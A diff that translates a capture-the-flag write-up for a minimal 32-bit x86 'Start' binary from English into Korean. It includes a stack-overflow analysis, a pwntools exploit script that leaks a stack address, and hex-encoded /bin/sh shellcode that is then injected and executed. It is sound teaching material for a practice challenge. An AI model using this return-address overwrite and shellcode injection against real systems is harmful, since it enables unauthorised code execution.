@@ -13,11 +13,11 @@ authors:
     image: "https://github.com/Phantomn.png"
 ---
 
-## Overview
+## 개요
 
-Start is a minimal 32-bit Linux binary written entirely in x86 assembly with no libc, no stack protection, and no NX. The challenge requires leaking a stack address then injecting shellcode.
+Start는 libc 없이 순수 x86 어셈블리로 작성된 최소화된 32비트 Linux 바이너리다. 스택 보호도 없고 NX도 없다. 스택 주소를 누출한 뒤 셸코드를 주입하는 문제다.
 
-## Source
+## 소스
 
 ```asm
 push    esp
@@ -40,30 +40,32 @@ xor     ebx, ebx
 mov     dl, 3Ch         ; len = 60
 mov     al, 3
 int     80h             ; sys_read(0, ecx, 60)
-add     esp, 14h        ; restore stack by 20 bytes
+add     esp, 14h        ; 스택 20바이트 복원
 retn
 ```
 
-## Analysis
+## 분석
 
-The code:
-1. Zeros out `eax`, `ebx`, `ecx`, `edx`
-2. Pushes the string `"Let's start the CTF:"` (5 dwords = 20 bytes) onto the stack
-3. Copies `esp` into `ecx` — the `sys_write` address parameter — without modifying `esp` itself
-4. Calls `sys_write(stdout, esp, 20)` to print the prompt
-5. Calls `sys_read(stdin, ecx, 60)` — reads 60 bytes into the same `ecx` (which still points to the stack)
-6. Runs `add esp, 14h` to pop the 20 bytes of string data off the stack
-7. Executes `retn` — pops the next value off the stack as the return address
+이 코드의 흐름:
+1. `eax`, `ebx`, `ecx`, `edx`를 0으로 초기화
+2. `"Let's start the CTF:"` 문자열(5개 dword = 20바이트)을 스택에 push
+3. `esp`를 `ecx`에 복사 — `sys_write`의 버퍼 주소 파라미터 — `esp` 자체는 변경하지 않음
+4. `sys_write(stdout, esp, 20)` 호출로 프롬프트 출력
+5. `sys_read(stdin, ecx, 60)` 호출 — 동일한 `ecx`(스택을 가리킴)에 60바이트 읽음
+6. `add esp, 0x14`로 20바이트 문자열 데이터를 스택에서 제거
+7. `retn` 실행 — 스택에서 다음 값을 팝해 리턴 주소로 사용
 
-The `read` call accepts 60 bytes but the string data is only 20 bytes. After `add esp, 0x14`, the first 4 bytes past the string data become the return address. That gives 20 bytes of buffer + 4 bytes to overwrite `ret`.
+read 호출은 60바이트를 받지만 문자열 데이터는 20바이트밖에 없다. `add esp, 0x14` 이후 문자열 데이터 바로 다음 4바이트가 리턴 주소가 된다. 즉 20바이트 버퍼 + 4바이트 ret 덮어쓰기가 가능하다.
 
-## Exploitation Strategy
+## 익스플로잇 전략
 
-The key insight: `esp` does not change between the `sys_write` and `sys_read` calls. The `sys_write` call prints the current stack pointer value as part of the output. By redirecting `ret` back to the `mov ecx, esp` instruction (`0x8048087`), the program executes `sys_write(stdout, esp, 20)` a second time — this time the stack has shifted by 20 bytes due to `add esp, 0x14`, so it leaks the actual return address area.
+핵심 아이디어: `esp`는 `sys_write`와 `sys_read` 호출 사이에서 변하지 않는다. 출력 전에 스택에 문자열을 push할 때 현재 `esp` 값이 그대로 `ecx`에 들어간다.
 
-The leaked 4 bytes give us a live stack address. Adding `0x14` to it points past the string region, directly into where shellcode will land in the second payload.
+`ret`를 `mov ecx, esp` 명령(`0x8048087`)으로 리다이렉트하면, 프로그램이 `sys_write(stdout, esp, 20)`를 한 번 더 실행한다. 이때 `add esp, 0x14`로 스택이 20바이트 이동했으므로, 리턴 주소 영역을 누출할 수 있다.
 
-## Solve
+누출된 4바이트가 실제 스택 주소다. 여기에 `0x14`를 더하면 두 번째 페이로드에서 셸코드가 위치할 주소를 정확히 가리킨다.
+
+## 풀이
 
 ```python
 from pwn import *
@@ -77,22 +79,22 @@ shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe
 
 print p.recvuntil("Let's start the CTF:")
 
-# Stage 1: overwrite ret with 0x8048087 (mov ecx, esp) to leak stack address
+# Stage 1: ret를 0x8048087(mov ecx, esp)로 덮어 스택 주소 누출
 payload = ""
-payload += "A" * 20          # fill the string buffer
-payload += p32(0x8048087)    # ret → back to mov ecx, esp → triggers sys_write again
+payload += "A" * 20          # 문자열 버퍼 채우기
+payload += p32(0x8048087)    # ret → mov ecx, esp로 복귀 → sys_write 재실행
 
 p.send(payload)
 
-# The second sys_write prints 20 bytes starting from the (now shifted) esp
+# 두 번째 sys_write가 이동된 esp부터 20바이트 출력
 leak = u32(p.recv(4))
 print "leak : ", hex(leak)
 p.recv()
 
-# Stage 2: send shellcode; jump to leak+0x14 (past the 20-byte padding, into shellcode)
+# Stage 2: 셸코드 전송; leak+0x14(패딩 20바이트 이후)로 점프
 payload2 = ""
-payload2 += "\x90" * 0x14   # NOP sled / padding
-payload2 += p32(leak + 0x14) # ret → stack address where shellcode begins
+payload2 += "\x90" * 0x14   # NOP 슬레드 / 패딩
+payload2 += p32(leak + 0x14) # ret → 셸코드가 시작되는 스택 주소
 payload2 += shellcode
 
 p.send(payload2)
@@ -100,7 +102,7 @@ p.send(payload2)
 p.interactive()
 ```
 
-## Payload Breakdown
+## 페이로드 분석
 
 **Stage 1**
 
@@ -108,15 +110,15 @@ p.interactive()
 [A * 20][0x8048087]
   ^           ^
   |           |
-  fill        ret → mov ecx, esp (re-execute write to leak esp)
+  채우기       ret → mov ecx, esp (write 재실행으로 esp 누출)
 ```
 
 **Stage 2**
 
 ```
-[NOP * 20][leak + 0x14][shellcode]
+[NOP * 20][leak + 0x14][셸코드]
                ^
-               ret points here → executes shellcode
+               ret → 셸코드 실행
 ```
 
-The leaked address is the `esp` value at the time of the second `sys_write`. Since `esp` shifts by `0x14` after each iteration of `add esp, 14h`, adding `0x14` to the leaked value gives the address immediately after the padding — exactly where the shellcode starts in the second payload.
+누출된 주소는 두 번째 `sys_write` 시점의 `esp` 값이다. 각 `add esp, 0x14` 반복마다 `esp`가 `0x14`씩 이동하므로, 누출된 값에 `0x14`를 더하면 두 번째 페이로드에서 패딩 직후 — 정확히 셸코드가 시작되는 위치 — 의 주소가 된다.
